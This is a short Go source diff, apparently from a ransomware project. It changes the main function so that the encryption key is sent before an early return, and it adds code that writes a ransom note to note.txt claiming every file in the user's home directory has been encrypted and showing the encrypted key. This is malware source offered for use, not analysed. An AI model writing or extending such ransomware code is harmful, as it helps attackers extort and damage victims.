@@ -53,9 +53,9 @@ func main() {
 		fmt.Println(err)
 		os.Exit(1)
 	}
+	sendKey(hexKey)
 	return
 	traverseFiles(testdir)
-	sendKey(hexKey)
 }
 
 func genKey() error {
@@ -169,5 +169,20 @@ func sendKey(hexKey string) error {
 		fmt.Println(err)
 		return err
 	}
+
+	n, err := os.Create("note.txt")
+	if err != nil {
+		fmt.Println(err)
+		return err
+	}
+	defer n.Close()
+	home, _ := os.UserHomeDir()
+	s := fmt.Sprintf("All files in %s have been encrypted.\nEncrypted key: %s", home, hexKey)
+	_, err = n.WriteString(s)
+	if err != nil {
+		fmt.Println("Error writing file: ", err)
+		return err
+	}
 	return nil
 }
+
